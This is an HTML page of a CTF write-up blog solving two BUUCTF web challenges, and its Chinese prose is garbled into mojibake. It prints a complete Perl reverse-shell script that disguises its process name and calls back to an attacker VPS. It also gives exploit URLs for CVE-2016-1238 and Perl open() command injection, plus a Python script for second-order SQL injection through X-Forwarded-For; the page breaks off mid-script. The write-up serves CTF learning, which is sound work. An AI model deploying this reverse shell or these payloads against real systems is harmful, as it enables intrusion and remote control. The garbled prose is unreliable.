<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.0"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><!--!--><title>BUUCTF-webåˆ·é¢˜â…¢ - ggb0n&#039;s Blog</title><meta description="BUUåˆ·é¢˜è®°å½•ä¹‹ä¸‰äº†ï¼Œåˆ·é¢˜æœç„¶å¼€çœ¼ç•Œï¼Œä¸è¿‡â€¦ æˆ‘å¥½èœğŸ˜ï¼Œä¸æ˜¯é‚£ä¸ªè”¡ğŸ˜’"><meta property="og:type" content="article"><meta property="og:title" content="BUUCTF-webåˆ·é¢˜â…¢"><meta property="og:url" content="http://ggb0n.cool/2020/02/15/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A2/"><meta property="og:site_name" content="ggb0n&#039;s blog"><meta property="og:description" content="BUUåˆ·é¢˜è®°å½•ä¹‹ä¸‰äº†ï¼Œåˆ·é¢˜æœç„¶å¼€çœ¼ç•Œï¼Œä¸è¿‡â€¦ æˆ‘å¥½èœğŸ˜ï¼Œä¸æ˜¯é‚£ä¸ªè”¡ğŸ˜’"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://ggb0n.cool/images/icon2.png"><meta property="article:published_time" content="2020-02-15T07:14:12.000Z"><meta property="article:modified_time" content="2020-04-22T00:13:36.197Z"><meta property="article:author" content="ggb0n"><meta property="article:tag" content="CTF"><meta property="article:tag" content="web"><meta property="article:tag" content="RCE"><meta property="article:tag" content="SSRF"><meta property="article:tag" content="perlä¸‹åˆ©ç”¨openå‘½ä»¤è¿›è¡ŒRCE"><meta property="article:tag" content="XFFæ³¨å…¥"><meta property="article:tag" content="äºŒæ¬¡æ³¨å…¥"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="http://ggb0n.cool/images/icon2.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://ggb0n.cool/2020/02/15/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A2/"},"headline":"BUUCTF-webåˆ·é¢˜â…¢","image":["http://www.ggb0n.cool/images/back2.png"],"datePublished":"2020-02-15T07:14:12.000Z","dateModified":"2020-04-22T00:13:36.197Z","author":{"@type":"Person","name":"ggb0n"},"description":"BUUåˆ·é¢˜è®°å½•ä¹‹ä¸‰äº†ï¼Œåˆ·é¢˜æœç„¶å¼€çœ¼ç•Œï¼Œä¸è¿‡â€¦ æˆ‘å¥½èœğŸ˜ï¼Œä¸æ˜¯é‚£ä¸ªè”¡ğŸ˜’"}</script><link rel="alternative" href="/atom.xml" title="ggb0n&#039;s Blog" type="application/atom+xml"><link rel="icon" href="http://www.ggb0n.cool/images/icon2.png"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.12/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><link rel="stylesheet" href="/css/style.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><script src="/js/md5.min.js"></script></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo1.png" alt="ggb0n&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">é¦–é¡µ</a><a class="navbar-item" href="/archives">å½’æ¡£</a><a class="navbar-item" href="/categories">åˆ†ç±»</a><a class="navbar-item" href="/tags">æ ‡ç­¾</a><a class="navbar-item" href="/friend">å‹é“¾</a><a class="navbar-item" href="/message">ç•™è¨€</a><a class="navbar-item" href="/about">å…³äº</a><a class="navbar-item" href="/tools">CyberChef</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><div class="card-image"><span class="image is-7by3"><img class="thumbnail" src="http://ggb0n.cool/images/buuctf-top.png" alt="BUUCTF-webåˆ·é¢˜â…¢"></span></div><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-02-15T07:14:12.000Z">2020-02-15</time><a class="commentCountImg" href="/2020/02/15/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A2/#comment-container"><span class="display-none-class">7b84e2402b3c39c7a94d8e35498852a9</span><img class="not-gallery-item" src="/img/chat.svg">Â <span class="commentCount" id="7b84e2402b3c39c7a94d8e35498852a9">Â 99+</span>Â Â Â Â </a><span class="level-item">43 minutes read (About 6404 words)</span><span class="level-item" id="busuanzi_container_page_pv"><i class="far fa-eye"></i>&nbsp;&nbsp;<span id="busuanzi_value_page_pv">0</span> visits</span></div></div><h1 class="title is-3 is-size-4-mobile">BUUCTF-webåˆ·é¢˜â…¢</h1><div class="content"><p>BUUåˆ·é¢˜è®°å½•ä¹‹ä¸‰äº†ï¼Œåˆ·é¢˜æœç„¶å¼€çœ¼ç•Œï¼Œä¸è¿‡â€¦ æˆ‘å¥½èœğŸ˜ï¼Œä¸æ˜¯é‚£ä¸ªè”¡ğŸ˜’<a id="more"></a></p>
<h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><p>ä¸»è¦è€ƒå¯Ÿ<code>Perl</code>ä¸‹å­˜åœ¨çš„æ¼æ´ï¼š<a href="https://nvd.nist.gov/vuln/detail/CVE-2016-1238">CVE-2016-1238</a>å’Œ<code>open</code>å‘½ä»¤å¯¼è‡´å‘½ä»¤æ‰§è¡Œçš„æ¼æ´ã€‚åˆ©ç”¨æ­¤æ¼æ´è¿›è¡ŒSSRFã€‚</p>
<h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®ï¼Œç»™å‡ºäº†å¦‚ä¸‹çš„æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $sandbox = <span class="string">"sandbox/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]); </span><br><span class="line">    @mkdir($sandbox); </span><br><span class="line">    @chdir($sandbox); </span><br><span class="line">    $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($_GET[<span class="string">"url"</span>])); </span><br><span class="line">    $info = pathinfo($_GET[<span class="string">"filename"</span>]); </span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>])); </span><br><span class="line">    @mkdir($dir); </span><br><span class="line">    @chdir($dir); </span><br><span class="line">    @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data); </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>åŒæ—¶ä¹Ÿç»™å‡ºäº†<code>REMOTE_ADDR</code>ï¼Œè¿™åœ¨åé¢è§£é¢˜ç”¨å¾—åˆ°ã€‚<br>åˆ†æä»£ç æˆ‘ä»¬å¯ä»¥æ¢³ç†å‡ºå…¶é€»è¾‘ï¼š</p>
<blockquote>
<p>1.åŸºäº<code>REMOTE_ADDR</code>åˆ›å»ºæ²™ç®±æ–‡ä»¶å¤¹ï¼›<br>2.å°†ä¼ å…¥çš„URLå¸¦å…¥å‘½ä»¤<code>GET</code>æ‰§è¡Œã€‚è¿™é‡Œçš„<code>GET</code>å‘½ä»¤æ˜¯<a href="https://blog.csdn.net/ace_fei/article/details/7258700">Lib for WWW in Perl</a>ä¸­çš„å‘½ä»¤ï¼Œç›®çš„æ˜¯æ¨¡æ‹Ÿ<code>http</code>çš„<code>GET</code>è¯·æ±‚ï¼›<br>3.åˆ©ç”¨<a href="https://www.runoob.com/php/func-filesystem-pathinfo.html">pathinfoå‡½æ•°</a>è§£æä¼ å…¥çš„<code>filename</code>å‚æ•°ï¼Œè·å–è·¯å¾„åæœ€åä¸€å±‚æ–‡ä»¶å¤¹åˆ›å»ºå¹¶è¿›å…¥è¯¥è·¯å¾„ï¼›<br>4.åˆ©ç”¨<a href="https://www.runoob.com/php/func-filesystem-basename.html">basenameå‡½æ•°</a>è·å–<code>filename</code>ä¼ å‚å†…å®¹çš„æœ€åä»¥åŠæ–‡ä»¶å¤¹åç§°ï¼›<br>5.åˆ©ç”¨â€‹<a href="https://www.runoob.com/php/func-filesystem-file-put-contents.html">file_put_contentså‡½æ•°</a>å°†<code>GET</code>å‘½ä»¤æ‰§è¡Œçš„ç»“æœå†™å…¥ä»¥<code>filename</code>ä¸­çš„æ–‡ä»¶åå‘½åçš„æ–‡ä»¶ä¸­ã€‚</p>
</blockquote>
<p>è¿™ä¸€é“é¢˜æ¶‰åŠçš„çŸ¥è¯†ä¹‹å‰æ²¡é‡åˆ°è¿‡ï¼Œéœ€è¦å¥½å¥½å­¦ä¸€å­¦ï¼Œå‚è€ƒç½‘ä¸Šçš„é¢˜è§£å¾—çŸ¥æœ‰ä¸¤ç§è§£é¢˜æ€è·¯ï¼š</p>
<ul>
<li>åˆ©ç”¨<code>Perl5</code>çš„ä¸€ä¸ªCVE</li>
<li>åˆ©ç”¨<code>Perl</code>çš„<code>open</code>å‘½ä»¤è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</li>
</ul>
<h4 id="åˆ©ç”¨CVE-2016-1238"><a href="#åˆ©ç”¨CVE-2016-1238" class="headerlink" title="åˆ©ç”¨CVE-2016-1238"></a>åˆ©ç”¨CVE-2016-1238</h4><p>æ¼æ´å¤§è‡´æ„æˆåŸå› æ˜¯ï¼š`</p>
<blockquote>
<p>å½“è§£æé‡åˆ°äº†éå®šä¹‰çš„åè®®(å®šä¹‰çš„åè®®åœ¨<code>perl5/LWP/Protocol</code>æ–‡ä»¶å¤¹ä¸‹å¯ä»¥çœ‹åˆ°ï¼Œé»˜è®¤æ”¯æŒ<code>GHTTP</code>ã€<code>cpan</code>ã€<code>data</code>ã€<code>file</code>ã€<code>ftp</code>ã€<code>gopher</code>ã€<code>http</code>ã€<code>https</code>ã€<code>loopback</code>ã€<code>mailto</code>ã€<code>nntp</code>ã€<code>nogo</code>åè®®)æ—¶, å¦‚<code>GGBON://ggb0n.com</code>ï¼Œä¼šè‡ªåŠ¨è¯»å–å½“å‰ç›®å½•ä¸‹çš„URIç›®å½•å¹¶æŸ¥çœ‹æ˜¯å¦æœ‰å¯¹åº”åè®®çš„<code>pmæ¨¡å—</code>å¹¶å°è¯•<code>eval &quot;require xxx&quot;</code>ï¼Œè¿™é‡Œæˆ‘ä»¬çš„æ¶æ„pmæ¨¡å—å°±ä¼šè¢«æ‰§è¡Œã€‚</p>
</blockquote>
<p>å€Ÿæ­¤æ¼æ´æ„é€ ä¸€ä¸ªåå¼¹shellçš„perlè„šæœ¬æ”¾åˆ°è‡ªå·±çš„VPSä¸Šï¼š</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"><span class="comment"># perl-reverse-shell - A Reverse Shell implementation in PERL</span></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line"><span class="keyword">use</span> FileHandle;</span><br><span class="line"><span class="keyword">use</span> POSIX;</span><br><span class="line"><span class="keyword">my</span> $VERSION = <span class="string">"1.0"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Where to send the reverse shell. Change these.</span></span><br><span class="line"><span class="keyword">my</span> $ip = <span class="string">'127.0.0.1'</span>;</span><br><span class="line"><span class="keyword">my</span> $port = <span class="number">12345</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Options</span></span><br><span class="line"><span class="keyword">my</span> $daemon = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">my</span> $auth   = <span class="number">0</span>; <span class="comment"># 0 means authentication is disabled and any </span></span><br><span class="line">        <span class="comment"># source IP can access the reverse shell</span></span><br><span class="line"><span class="keyword">my</span> $authorised_client_pattern = <span class="string">qr(^127\.0\.0\.1$);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Declarations</span></span><br><span class="line"><span class="string">my $global_page = "";</span></span><br><span class="line"><span class="string">my $fake_process_name = "/usr/sbin/apache";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Change the process name to be less conspicious</span></span><br><span class="line"><span class="string">$0 = "[httpd]";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Authenticate based on source IP address if required</span></span><br><span class="line"><span class="string">if (defined($ENV&#123;'REMOTE_ADDR'&#125;)</span>) &#123;</span><br><span class="line">    cgiprint(<span class="string">"Browser IP address appears to be: $ENV&#123;'REMOTE_ADDR'&#125;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">        <span class="keyword">unless</span> ($ENV&#123;<span class="string">'REMOTE_ADDR'</span>&#125; =~ $authorised_client_pattern) &#123;</span><br><span class="line">            cgiprint(<span class="string">"ERROR: Your client isn't authorised to view this page"</span>);</span><br><span class="line">            cgiexit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elsif</span> ($auth) &#123;</span><br><span class="line">    cgiprint(<span class="string">"ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access"</span>);</span><br><span class="line">    cgiexit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Background and dissociate from parent process if required</span></span><br><span class="line"><span class="keyword">if</span> ($daemon) &#123;</span><br><span class="line">    <span class="keyword">my</span> $pid = <span class="keyword">fork</span>();</span><br><span class="line">    <span class="keyword">if</span> ($pid) &#123;</span><br><span class="line">        cgiexit(<span class="number">0</span>); <span class="comment"># parent exits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setsid();</span><br><span class="line">    <span class="keyword">chdir</span>(<span class="string">'/'</span>);</span><br><span class="line">    <span class="keyword">umask</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make TCP connection for reverse shell</span></span><br><span class="line"><span class="keyword">socket</span>(SOCK, PF_INET, SOCK_STREAM, <span class="keyword">getprotobyname</span>(<span class="string">'tcp'</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">connect</span>(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;</span><br><span class="line">    cgiprint(<span class="string">"Sent reverse shell to $ip:$port"</span>);</span><br><span class="line">    cgiprintpage();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    cgiprint(<span class="string">"Couldn't open reverse shell to $ip:$port: $!"</span>);</span><br><span class="line">    cgiexit();    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Redirect STDIN, STDOUT and STDERR to the TCP connection</span></span><br><span class="line"><span class="keyword">open</span>(STDIN, <span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line"><span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line"><span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line">$ENV&#123;<span class="string">'HISTFILE'</span>&#125; = <span class="string">'/dev/null'</span>;</span><br><span class="line"><span class="keyword">system</span>(<span class="string">"w;uname -a;id;pwd"</span>);</span><br><span class="line"><span class="keyword">exec</span>(&#123;<span class="string">"/bin/sh"</span>&#125; ($fake_process_name, <span class="string">"-i"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around print</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprint</span> </span>&#123;</span><br><span class="line">    <span class="keyword">my</span> $line = <span class="keyword">shift</span>;</span><br><span class="line">    $line .= <span class="string">"&lt;p&gt;\n"</span>;</span><br><span class="line">    $global_page .= $line;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around exit</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiexit</span> </span>&#123;</span><br><span class="line">    cgiprintpage();</span><br><span class="line">    <span class="keyword">exit</span> <span class="number">0</span>; <span class="comment"># 0 to ensure we don't give a 500 response.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Form HTTP response using all the messages gathered by cgiprint so far</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprintpage</span> </span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Content-Length: "</span> . <span class="keyword">length</span>($global_page) . <span class="string">"\r Connection: close\r Content-Type: text\/html\r\n\r\n"</span> . $global_page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç„¶ååˆ©ç”¨ä»£ç çš„é€»è¾‘æ„é€ payloadï¼š</p>
<figure class="highlight nix"><table><tr><td class="code"><pre><span class="line">/?<span class="attr">url=your</span> vps's perl backdoor&amp;<span class="attr">filename=URI/ggb0n.pm</span></span><br></pre></td></tr></table></figure>
<p>è¿™å°±åœ¨æ²™ç®±æ–‡ä»¶å¤¹çš„URLä¸‹å†™å…¥äº†åå¼¹shellçš„pmæ–‡ä»¶ï¼Œæœ€ååœ¨ä¸ªäººçš„VPSä¸Šç›‘å¬pmæ–‡ä»¶ä¸­å†™å¥½çš„ç«¯å£å¹¶æ„é€ å¦‚ä¸‹çš„payloadè¿›è¡Œè®¿é—®ï¼š</p>
<figure class="highlight qml"><table><tr><td class="code"><pre><span class="line">/?<span class="built_in">url</span>=<span class="attribute">GGBON</span>:<span class="comment">//ggb0n.com&amp;filename=xxx</span></span><br></pre></td></tr></table></figure>
<p>å³å¯æ‹¿åˆ°shellã€‚<br>æ³¨æ„ï¼šè¿™é‡Œçš„<code>GGBON</code>å¯ä»¥ä¸ºä»»æ„çš„ä¸å±äºä¸Šé¢è¯´åˆ°çš„å¯ä»¥è§£æçš„å­—ç¬¦ä¸²ã€‚</p>
<h4 id="åˆ©ç”¨perlçš„openå‘½ä»¤è¿›è¡ŒSSRF"><a href="#åˆ©ç”¨perlçš„openå‘½ä»¤è¿›è¡ŒSSRF" class="headerlink" title="åˆ©ç”¨perlçš„openå‘½ä»¤è¿›è¡ŒSSRF"></a>åˆ©ç”¨perlçš„openå‘½ä»¤è¿›è¡ŒSSRF</h4><p>é¦–å…ˆæ‰©å±•ä¸€ä¸‹<code>open</code>å‘½ä»¤å¯¼è‡´å‘½ä»¤æ‰§è¡Œçš„è¿‡ç¨‹ï¼Œå‚è€ƒç½‘ä¸Šçš„èµ„æ–™ï¼š</p>
<blockquote>
<p>Executing Programs with â€œopenâ€<br>In addition to what we saw last week, the â€œopenâ€ command has one more very<br>powerful application: it allows you to execute a command, send input and<br>receive output.<br>Try this program (it only works on Unix):</p>
</blockquote>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line">  <span class="keyword">use</span> strict;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">open</span> DATA, <span class="string">"who |"</span>   <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"Couldn't execute program: $!"</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="keyword">defined</span>( <span class="keyword">my</span> $line = &lt;DATA&gt; )  ) &#123;</span><br><span class="line">    <span class="keyword">chomp</span>($line);</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"$line\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">close</span> DATA;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Hereâ€™s what happened: Perl saw that your â€œfileâ€ ended with a â€œpipeâ€ (verticalbar) character. So it interpreted the â€œfileâ€ as a command to be executed, and interpreted the commandâ€™s output as the â€œfileâ€â€˜s contents. The command is â€œwhoâ€ (which prints information on currently logged-in users). If you execute that command, you will see that the output is exactly what the Perl program gave you.</p>
<p>In this case, we â€œreadâ€ data from the command. To execute a command that we can â€œwriteâ€ (send data) to, we should place a pipe character BEFORE the command. These options are mutually exclusive: we can read from a command or write to it, but not both.</p>
<p>In the Unix world, a lot can be done by piping the output of one program into the input of another. Perl continues this spirit.</p>
<p>Note that we can also send command-line parameters to the command, like this:</p>
</blockquote>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">open DATA, <span class="string">"who -H |"</span>    <span class="keyword">or </span><span class="keyword">die </span><span class="string">"Couldn't execute program: $!"</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>In fact, Perl allows you to use â€œopenâ€ to do pretty much anything you would normally do on the command-line, as this example demonstrates:</p>
</blockquote>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span> <span class="literal">OUTPUT</span>, <span class="string">"| grep 'foo' &gt; result.txt"</span>     <span class="keyword">or</span> die <span class="string">"Failure: $!"</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>We can then write whatever we want to the â€œOUTPUTâ€ filehandle. The Unix â€œgrepâ€ command will filter out any text which doesnâ€™t contain the text â€œfooâ€; any text which DOES contain â€œfooâ€ will be written to â€œresult.txtâ€.</p>
</blockquote>
<p>perlä¸‹openå‘½ä»¤çš„featureä»£ç å¤„ç†fileåè®®çš„ä»£ç åœ¨<code>perl5/LWP/Protocol/file.pm</code>ä¸‹ï¼š</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">#ç¬¬47è¡Œ</span></span><br><span class="line">    <span class="comment"># test file exists and is readable</span></span><br><span class="line">    <span class="keyword">unless</span> (-e $path) &#123;</span><br><span class="line">    <span class="keyword">return</span> HTTP::Response-&gt;new( &amp;HTTP::Status::RC_NOT_FOUND,</span><br><span class="line">                  <span class="string">"File `$path' does not exist"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unless</span> (-r <span class="number">_</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> HTTP::Response-&gt;new( &amp;HTTP::Status::RC_FORBIDDEN,</span><br><span class="line">                  <span class="string">'User does not have read permission'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment">#ç¬¬127è¡Œ</span></span><br><span class="line">    <span class="comment"># read the file</span></span><br><span class="line">    <span class="keyword">if</span> ($method <span class="keyword">ne</span> <span class="string">"HEAD"</span>) &#123;</span><br><span class="line">    <span class="keyword">open</span>(F, $path) <span class="keyword">or</span> <span class="keyword">return</span> new</span><br><span class="line">        HTTP::Response(&amp;HTTP::Status::RC_INTERNAL_SERVER_ERROR,</span><br><span class="line">               <span class="string">"Cannot read file '$path': $!"</span>);</span><br><span class="line">    <span class="keyword">binmode</span>(F);</span><br><span class="line">    $response =  $self-&gt;collect($arg, $response, <span class="function"><span class="keyword">sub</span> </span>&#123;</span><br><span class="line">        <span class="keyword">my</span> $content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">my</span> $bytes = <span class="keyword">sysread</span>(F, $content, $size);</span><br><span class="line">        <span class="keyword">return</span> \$content <span class="keyword">if</span> $bytes &gt; <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> \ <span class="string">""</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">close</span>(F);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆå¾—æ»¡è¶³å‰é¢çš„æ–‡ä»¶å­˜åœ¨, æ‰ä¼šç»§ç»­åˆ°openè¯­å¥, æ‰€ä»¥åœ¨æ‰§è¡Œå‘½ä»¤å‰å¾—ä¿è¯æœ‰ç›¸åº”çš„åŒåæ–‡ä»¶, æ‰€ä»¥å…ˆè¯·æ±‚ï¼š</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">/?<span class="attribute">url</span>=file:bash -c /readflag|&amp;<span class="attribute">filename</span>=bash -c /readflag|</span><br></pre></td></tr></table></figure>
<p>ç„¶åè¯·æ±‚å¦‚ä¸‹çš„payloadæ¥åˆ›å»ºç›¸åº”çš„åŒåæ–‡ä»¶ï¼š</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">/?<span class="attribute">url</span>=file:bash -c /readflag|&amp;<span class="attribute">filename</span>=123</span><br></pre></td></tr></table></figure>
<p>æœ€ååˆ©ç”¨opençš„featureæ‰§è¡Œä»£ç è®¿é—®<code>/sandbox/å“ˆå¸Œå€¼/123</code>å°±èƒ½å¾—åˆ°flagã€‚</p>
<p>å…¶å®è¿˜ä¸æ˜¯å¾ˆæ‡‚ï¼Œå…ˆç•™åœ¨è¿™ï¼Œå†æ…¢æ…¢å­¦ä¹ ã€‚</p>
<h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>XFFå¤„å­˜åœ¨äºŒæ¬¡æ³¨å…¥</p>
<h3 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>è¿›å…¥é¢˜ç›®æŸ¥çœ‹æºç å‘ç°ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Debug Info: </span></span><br><span class="line"><span class="comment"> Duration: 0.029144048690796 s </span></span><br><span class="line"><span class="comment"> Current Ip: 174.0.81.45  --&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæç¤ºå½“å‰çš„IPï¼Œæƒ³åˆ°åˆ©ç”¨å·¥å…·æ”¹ä¸€ä¸‹XFFè¯•è¯•ï¼Œç»“æœå‘ç°å›æ˜¾å¦‚ä¸‹ï¼š</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">&lt;!--</span> <span class="attr">Debug Info:</span> </span><br><span class="line"> <span class="attr">Duration:</span> <span class="number">0.035063982009888</span> <span class="string">s</span> </span><br><span class="line"> <span class="attr">Current Ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> </span><br><span class="line"><span class="attr">Last Ip:</span> <span class="number">174.0</span><span class="number">.81</span><span class="number">.45</span> <span class="string">--&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¯´æ˜äº†ä¸Šä¸€ä¸ªIPè¢«è®°å½•äº†èµ·æ¥ï¼Œå½“ç„¶ä¹Ÿåªèƒ½æ˜¯è®°å½•åœ¨æ•°æ®åº“ä¸­ï¼Œé‚£ä¹ˆå¦‚æœæ„é€ ä¸€ä¸ªSQLæ³¨å…¥è¯­å¥çš„XFFå¤´ä¸Šä¼ ï¼Œç„¶åå†éšä¾¿æ¢ä¸€ä¸ªXFFå¤´è®¿é—®ï¼Œä¸å°±æ˜¯å¯ä»¥å‡ºå‘äºŒæ¬¡æ³¨å…¥äº†å—ï¼Œæœ€ç»ˆç”¨èµµå¸ˆå‚…çš„è„šæœ¬è·‘å‡ºäº†ç»“æœã€‚<br>å‚è€ƒèµµå¸ˆå‚…çš„è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">"http://node3.buuoj.cn:28041/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_sql</span><span class="params">(sql)</span>:</span></span><br><span class="line">    print(<span class="string">"[*]è¯·æ±‚è¯­å¥ï¼š"</span> + sql)</span><br><span class="line">    return_result = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"0'|length(("</span> + sql + <span class="string">"))|'0"</span></span><br><span class="line">    session = requests.session()</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: payload&#125;)</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)</span><br><span class="line">    start_pos = r.text.find(<span class="string">"Last Ip: "</span>)</span><br><span class="line">    end_pos = 